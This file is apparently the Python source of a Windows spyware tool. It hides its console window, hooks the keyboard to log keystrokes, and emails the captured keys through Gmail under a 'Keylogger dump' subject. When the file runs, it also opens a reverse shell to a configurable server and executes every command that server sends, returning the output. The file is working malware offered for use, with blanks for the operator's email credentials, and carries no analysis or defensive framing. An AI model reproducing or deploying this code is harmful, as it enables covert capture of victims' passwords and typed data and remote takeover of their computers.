import pythoncom
import PyHook3
import threading
import smtplib
import datetime, time
import win32.win32console, win32.win32gui
import socket
import subprocess
import os

SERVER_HOST = "192.168.1.2" # CHANGE ACCORDINGLY
SERVER_PORT = 5103
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
data = ''

class TimerClass(threading.Thread):
    def run(self):
            global data                                                     
            ts = datetime.datetime.now()  
            timestamp = ts.strftime("%b %d %Y %H:%M:%S")                    
            SERVER = "smtp.gmail.com"                                       
            PORT = 587                   
            USER = ""   #INSERT EMAIL
            PASS = ""   #INSERT PASSWORD                
            FROM = USER                                                    
            TO = ""     #INSERT EMAIL FOR RECEIVING LOGS FROM KEYLOGGER                       
            SUBJECT = "Keylogger dump @timestamp{" + timestamp + "}:"      
            MESSAGE = data                                                  
            message = """\
From: %s
To: %s
Subject: %s
%s
""" % (FROM, TO, SUBJECT, MESSAGE)
            try:
                with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
                    smtp.ehlo()
                    smtp.starttls() 
                    smtp.ehlo()
                    smtp.login(USER, PASS) 
                    smtp.sendmail(FROM, TO, MESSAGE)
                    data = ''
                    smtp.quit()
            except Exception as e:
                print(e)

def keyPressed(event):
    global data

    key = chr(event.Ascii)
    data = data + key

    if len(data) > 100:
        emailClient = TimerClass()
        emailClient.run()

    return True

def hideConsole():
    window = win32.win32console.GetConsoleWindow()
    win32.win32gui.ShowWindow(window, 0)

def connect():
    s = socket.socket()
    s.connect((SERVER_HOST, SERVER_PORT))

    cwd = os.getcwd()
    s.send(cwd.encode())

    while True:
        command = s.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            break
        if splited_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        else:
            output = subprocess.getoutput(command)
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())
    s.close()

def run():
    hideConsole()

    obj = PyHook3.HookManager()
    obj.KeyDown = keyPressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()

def conn():
    connect()

conn()